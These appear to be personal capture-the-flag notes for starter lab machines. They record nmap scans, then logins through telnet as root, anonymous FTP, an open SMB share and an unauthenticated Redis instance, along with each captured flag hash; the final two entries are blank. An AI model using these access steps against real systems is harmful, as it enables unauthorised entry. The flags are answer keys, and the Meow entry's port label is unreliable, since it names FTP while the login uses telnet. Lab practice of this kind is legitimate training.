# STARTING POINT BOXES

--------------------------------------------------------------------

**TOOLS USED**: nmap


--------------------------------------------------------------------

## MEOW BOX

**IP Address**: 10.129.70.43

```
nmap -sC -sV -oN nmap.txt 10.129.70.43
```

**EXPOSED PORT (SERVICE)**: 21 (ftp)

```
telnet 10.129.70.43
```

user: root

FLAG: b40abdfe23665f766f9c61ecba8a4c19

--------------------------------------------------------------------

## FAWN BOX

**IP Address**: 10.129.98.220

```
nmap -sC -sV -oN nmap.txt 10.129.98.220
```

Anonymous ftp login was enabled
```
ftp 10.129.98.220
```
user: anonymous<br>
passwd: anonymous<br>

```
get flag.txt
```

FLAG: 035db21c881520061c53e0536e44f815

--------------------------------------------------------------------

## DANCING BOX

**IP Address**: 10.129.142.29

```
nmap -sC -sV -oN dancing_nmap.txt 10.129.142.29
```

To list the smb shares:
```
smbclient -L 10.129.142.29
```
Shares: ADMIN$, C$, IPC$, WorkShares

WorkShares doesn't require a password. Other ones are default shares ($)

```
smbclient //10.129.142.29/WorkShares
get flag.txt
```

FLAG: 5f61c10dffbc77a704d76016a22f1664

--------------------------------------------------------------------

## REDEEMER

**IP Address**: 10.129.34.251

```
nmap -sC -p- -T5 -oN redeemer_nmap.txt 10.129.34.251
```

-p-: all ports
-T5: speed up scan because -p- is slow

**EXPOSED PORT (SERVICE)**: 6379 (redis)

Redis: in-memory database

```
redis-cli -h 10.129.34.251
INFO SERVER
INFO KEYSPACE
SELECT 0
KEYS *
GET FLAG
```

FLAG: 03e1d2b376c37ab3f5319922053953eb"

--------------------------------------------------------------------

## EXPLOSION

**IP Address**:

FLAG:

--------------------------------------------------------------------

## PREIGNITION

**IP Address**:

FLAG:
